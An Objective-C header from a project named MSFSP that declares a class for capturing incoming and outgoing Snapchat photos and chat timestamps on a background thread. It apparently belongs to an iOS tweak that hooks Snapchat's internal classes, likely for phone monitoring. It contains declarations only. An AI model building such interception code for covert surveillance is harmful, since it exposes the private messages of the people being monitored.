//
//  SnapchatOfflineUtils.h
//  MSFSP
//
//  Created by Makara on 5/23/14.
//
//

#import <Foundation/Foundation.h>

@class SCChat, SCChatMedia;

@interface SnapchatOfflineUtils : NSObject {
@private
    NSDate      *mNewestSCTextChatMediaTimestamp;
    NSThread    *mOfflineCaptureThread;
    
    NSOperationQueue    *mQueue;
}

@property (retain) NSDate *mNewestSCTextChatMediaTimestamp;
@property (retain) NSThread *mOfflineCaptureThread;
@property (readonly) NSOperationQueue *mQueue;

+ (id) sharedSnapchatOfflineUtils;

- (void) saveNewestSCTextChatMediaTimestamp: (NSDate *) aTimestamp;

- (void) captureIncomingSnapchatPhoto: (SCChat *) aChat
                            chatMedia: (SCChatMedia *) aChatMedia;
- (void) captureOutgoingSnapchatPhoto: (SCChat *) aChat
                            chatMedia: (SCChatMedia *) aChatMedia;

@end
